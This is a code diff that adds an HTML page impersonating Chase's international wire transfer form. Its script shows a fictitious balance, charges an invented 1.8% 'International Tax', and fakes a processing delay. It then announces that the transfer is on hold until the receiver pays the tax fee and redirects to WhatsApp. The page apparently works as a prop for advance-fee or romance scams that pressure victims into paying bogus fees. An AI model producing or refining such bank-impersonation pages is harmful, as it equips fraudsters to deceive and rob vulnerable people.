@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chase - International Transfer</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; padding: 40px; }
+        .container { background: white; width: 500px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.8rem; }
+        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .tax-info { background: #fff8e1; padding: 15px; margin-top: 20px; border-radius: 4px; border: 1px solid #ffe082; }
+        .btn { width: 100%; padding: 15px; background: #0060f0; color: white; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; font-weight: bold; }
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0060f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="loader"><div class="spinner"></div><p>Processing Secure Wire...</p></div>
+
+<div class="container">
+    <h2 style="color:#004a99; margin-top:0;">International Wire Transfer</h2>
+    <form id="wireForm">
+        <label>Select Currency</label>
+        <select required>
+            <option>Taiwan (TWD)</option><option>Hungary (HUF)</option>
+            <option>Mexico (MXN)</option><option>Thailand (THB)</option>
+            <option>Japan (JPY)</option><option>South Korea (KRW)</option>
+            <option>Brazil (BRL)</option><option>Switzerland (CHF)</option>
+            <option>Singapore (SGD)</option><option>Australia (AUD)</option>
+        </select>
+        <label>Recipient Full Name</label>
+        <input type="text" id="name" required>
+        <label>Bank Name</label>
+        <input type="text" required>
+        <label>Account / IBAN</label>
+        <input type="text" required>
+        <label>Amount (USD)</label>
+        <input type="number" id="amt" oninput="document.getElementById('tax').innerText = (this.value * 0.018).toFixed(2)" required>
+
+        <div class="tax-info">
+            <div style="display:flex; justify-content:space-between;">
+                <span>International Tax (1.8%):</span>
+                <span style="font-weight:bold;">$<span id="tax">0.00</span></span>
+            </div>
+        </div>
+
+        <button type="submit" class="btn">Confirm Transfer</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('wireForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        document.getElementById('loader').style.display = 'flex';
+
+        setTimeout(() => {
+            let amount = parseFloat(document.getElementById('amt').value);
+            let bal = localStorage.getItem('bankBalance') || 1756000;
+            
+            localStorage.setItem('bankBalance', bal - amount);
+
+            let history = JSON.parse(localStorage.getItem('transHistory')) || [];
+            history.push({
+                date: new Date().toLocaleDateString(),
+                to: document.getElementById('name').value,
+                amount: amount,
+                status: 'PENDING'
+            });
+            localStorage.setItem('transHistory', JSON.stringify(history));
+
+            alert("Transfer on hold. Tax fee must be cleared by receiver. Redirecting to WhatsApp...");
+            window.location.href = "https://wa.me";
+        }, 4000);
+    });
+</script>
+</body>
+</html>
+
